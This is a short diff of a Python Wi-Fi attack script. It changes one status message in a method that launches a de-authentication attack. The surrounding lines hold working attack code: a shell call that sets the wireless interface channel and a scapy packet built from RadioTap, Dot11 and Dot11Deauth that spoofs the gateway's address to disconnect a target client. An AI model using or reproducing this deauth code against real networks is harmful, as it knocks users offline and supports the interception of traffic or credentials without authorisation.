@@ -173,7 +173,7 @@ class Attack:
         output = input(Fore.YELLOW + "[*] To start the de-authentication attack on {} type ok or type quit: ".format(self.client_target) )
         if output == 'ok':
             os.system("iwconfig " + self.wlan_interface + " channel " + str(self.target_ap[2]))
-            print(Fore.YELLOW + "[*] Attacking {} on channel {} ".format(self.target_ap[0], self.target_ap[2]))
+            print(Fore.YELLOW + "[*] Attacking {} on channel {} type control + c to stop the process ".format(self.target_ap[0], self.target_ap[2]))
             # the frames are of 802.11 addr1 = destenation attr2 = source
             dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
             packet = RadioTap()/dot11/Dot11Deauth(reason=7)
